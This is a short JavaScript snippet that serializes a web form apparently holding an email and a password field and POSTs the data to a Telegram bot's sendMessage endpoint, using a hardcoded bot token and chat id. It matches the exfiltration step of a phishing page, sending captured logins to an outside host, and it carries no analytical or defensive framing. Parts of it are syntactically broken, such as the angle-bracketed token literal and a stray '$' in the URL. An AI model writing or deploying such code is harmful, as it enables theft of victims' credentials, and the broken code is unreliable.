const token = <<5903216139:AAGOMD7unyFYiCTiSYFM4Z0-ctRQyX2yc2E>>
const chat_id = <<1657791509>>

function sendForm()
{
     let formData = JSON.stringify($("#stdFord").serializeArray(),'email','pasD');
     
     const request = new Request(
          `https://api.telegram.org/bot$5903216139:AAGOMD7unyFYiCTiSYFM4Z0-ctRQyX2yc2E/sendMessage`,
          {
               method: 'POST',
               body: formData,
               headers: {
                     'Content-Type': 'application/json',
                     'accept': 'application/json',
               }
          },
     );

     fetch(request)
        .then(result => result.json())
        .then(data => {
             console.log(data);
        })
        .catch(error => console.log('Error', error));
}
